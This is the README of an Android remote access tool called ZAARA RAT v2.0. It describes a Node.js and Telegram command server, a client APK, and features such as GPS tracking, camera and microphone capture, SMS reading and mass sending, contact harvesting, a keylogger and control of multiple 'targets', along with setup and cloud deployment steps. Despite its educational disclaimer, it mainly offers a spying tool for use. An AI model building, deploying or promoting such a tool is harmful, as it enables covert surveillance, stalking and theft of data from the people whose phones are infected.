<div align="center">

# 🛡️ ZAARA RAT v2.0

### Advanced Android Remote Administration Tool

**⚠️ For Educational & Research Purposes Only ⚠️**

<p>
  <img src="images/logo.PNG" alt="ZAARA RAT Logo" width="200"/>
</p>

**Author:** ZAARA | **Version:** 2.0.0 | **License:** MIT (Educational Use)

[![Node.js](https://img.shields.io/badge/Node.js-v14+-green.svg)](https://nodejs.org/)
[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Status](https://img.shields.io/badge/Status-Active-success.svg)](https://github.com/zaara/zaara-rat)

</div>

---

## 📱 Control Panel

<p align="center">
  <img src="images/4.jpg" alt="Control Panel" width="700"/>
</p>

---

## 🎯 About

**ZAARA RAT v2.0** is a powerful Android Remote Administration Tool designed for cybersecurity education and penetration testing. Built with modern technologies and security-first approach.

### 🏗️ Architecture

- **Server:** Node.js, Express.js, Socket.IO
- **Control:** Telegram Bot API
- **Client:** Android APK (Kotlin)
- **Communication:** Real-time WebSocket

---

## ✨ Features

### 📱 Device Control
- 🛰️ **GPS Location** - Real-time location tracking
- 📷 **Camera Access** - Front and rear camera capture
- 🎙️ **Microphone** - Audio recording with custom duration
- 📋 **Clipboard** - Access clipboard content
- 📳 **Vibration** - Remote vibration control

### 💬 Communication
- ✉️ **SMS Manager** - Read, send, and manage messages
- ✉️ **SMS Broadcast** - Send to all contacts
- 👤 **Contacts** - Access full contact list
- 🔔 **Notifications** - Read and send notifications

### 📊 System Information
- 💻 **Installed Apps** - List all applications
- 📡 **SIM Info** - Carrier and network details
- 🔋 **Battery Status** - Real-time battery info
- 📱 **Device Info** - Model, manufacturer, Android version

### 🎨 Interaction
- 🗨️ **Toast Messages** - Display messages on device
- 🌐 **WebView** - Load custom web pages
- 🔗 **URL Opener** - Open any URL
- 🔐 **Keylogger** - Keystroke monitoring

### 🔒 Advanced Features
- 🆔 **Session Management** - UUID-based device tracking
- 🚦 **Rate Limiting** - Command throttling (10/min)
- 📊 **Activity Logging** - Comprehensive audit logs
- 📁 **File Upload** - Secure file transfer (50MB limit)
- 🔄 **Auto-Reconnect** - Resilient connections
- 🖥️ **Multi-Device** - Manage multiple targets

---

## 🚀 Quick Start

### Prerequisites
- Node.js v14+
- Telegram Bot Token
- Android device for testing

### Installation

```bash
# 1. Clone repository
git clone https://github.com/zaara/zaara-rat.git
cd zaara-rat

# 2. Install dependencies
npm install

# 3. Configure
cp data.json.example data.json
nano data.json  # Add your bot token and chat ID

# 4. Create required directories
mkdir logs uploads

# 5. Start server
npm start
```

### Configuration

Edit `data.json`:
```json
{
    "token": "YOUR_TELEGRAM_BOT_TOKEN",
    "id": "YOUR_TELEGRAM_CHAT_ID",
    "host": "http://localhost:3000/",
    "author": "ZAARA",
    "version": "2.0.0"
}
```

**Get Telegram Bot Token:**
1. Open Telegram, search `@BotFather`
2. Send `/newbot` and follow instructions
3. Copy your bot token

**Get Chat ID:**
1. Send message to your bot
2. Visit: `https://api.telegram.org/bot<TOKEN>/getUpdates`
3. Find your chat ID in the response

### Install Android APK

Transfer `CLIENT.apk` to your Android device and install. The app will connect automatically to your server.

---

## 📡 API Documentation

### Socket.IO Events

**Client → Server:**
- `device-info` - Device connection info
- `location-result` - GPS coordinates
- `contacts-result` - Contact list
- `messages-result` - SMS messages
- `apps-result` - Installed apps
- `clipboard-result` - Clipboard content

**Server → Client:**
- `get-location` - Request location
- `get-contacts` - Request contacts
- `send-sms` - Send SMS
- `capture-camera` - Take photo
- `record-audio` - Record audio
- `vibrate` - Vibrate device

### REST Endpoints

```
GET  /health       - Server health check
POST /upload       - File upload endpoint
GET  /stats        - Statistics dashboard
```

---

## 🔐 Security Features

- ✅ **UUID Session Management** - Unique device identification
- ✅ **Rate Limiting** - Prevents command flooding
- ✅ **Input Validation** - Sanitized inputs
- ✅ **Security Headers** - XSS and clickjacking protection
- ✅ **Comprehensive Logging** - Full audit trail
- ✅ **File Size Limits** - 50MB upload restriction
- ✅ **Error Handling** - No information disclosure

---

## 🖥️ Deployment

### Local
```bash
npm start
```

### Render.com (Free)
1. Create account on [Render.com](https://render.com)
2. New Web Service → Connect repository
3. Build: `npm install`
4. Start: `npm start`
5. Add environment variables

### Heroku
```bash
heroku create zaara-rat
heroku config:set TELEGRAM_BOT_TOKEN=your_token
git push heroku main
```

### VPS (Ubuntu)
```bash
# Install Node.js
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs

# Install PM2
sudo npm install -g pm2

# Start application
pm2 start server.js --name zaara-rat
pm2 save
pm2 startup
```

---

## 📊 Project Stats

- **Code:** 734 lines (clean, documented)
- **Features:** 15+ implemented
- **Security:** 8+ features
- **Dependencies:** 6 packages
- **API Events:** 20+ Socket.IO events

---

## ⚖️ Legal Disclaimer

### ⚠️ IMPORTANT NOTICE

This software is developed **exclusively for educational and research purposes** in cybersecurity.

**Legal Use Only:**
- ✅ Cybersecurity education and training
- ✅ Authorized penetration testing
- ✅ Security research in controlled environments
- ✅ Academic projects with proper oversight

**Prohibited Uses:**
- ❌ Unauthorized access to devices
- ❌ Stalking or harassment
- ❌ Privacy invasion
- ❌ Data theft
- ❌ Any illegal activities

**By using this software, you agree to:**
- Obtain explicit permission before use
- Comply with all applicable laws
- Accept full responsibility for your actions
- Not hold the author liable for misuse

**Unauthorized use may violate:**
- Computer Fraud and Abuse Act (CFAA)
- Electronic Communications Privacy Act (ECPA)
- GDPR and privacy regulations
- Local and international laws

---

## 🤝 Contributing

Contributions are welcome for educational improvements!

1. Fork the repository
2. Create feature branch (`git checkout -b feature/amazing-feature`)
3. Commit changes (`git commit -m 'Add amazing feature'`)
4. Push to branch (`git push origin feature/amazing-feature`)
5. Open Pull Request

---

## 📝 License

This project is licensed under the **MIT License** for educational purposes only.

**Additional Restrictions:**
- Commercial use is prohibited
- Must maintain attribution to ZAARA
- Must include this disclaimer in all copies
- Use only for lawful, authorized purposes

See [LICENSE](LICENSE) file for details.

---

## 👨‍💻 Author

**ZAARA**

- 🎓 Cybersecurity Researcher
- 📧 Contact: [Your Email/Contact]
- 🌐 GitHub: [@zaara](https://github.com/zaara)

---

## 🙏 Acknowledgments

- Node.js Community
- Socket.IO Team
- Telegram Bot API
- Cybersecurity Community
- Open Source Contributors

---

## 📞 Support

- 📖 Documentation: See code comments
- 🐛 Issues: [GitHub Issues](https://github.com/zaara/zaara-rat/issues)
- 💬 Discussions: [GitHub Discussions](https://github.com/zaara/zaara-rat/discussions)

---

<div align="center">

### 🛡️ ZAARA RAT v2.0

**Advanced Cybersecurity Education Through Ethical Research**

Developed with 💙 by ZAARA

📚 Knowledge • 🔐 Security • ⚖️ Ethics • 🎓 Education

---

**⭐ Star this repo if it helps your cybersecurity education!**

**Remember: With great power comes great responsibility. Use ethically and legally.**

---

© 2024 ZAARA. All rights reserved. Educational use only.

</div>
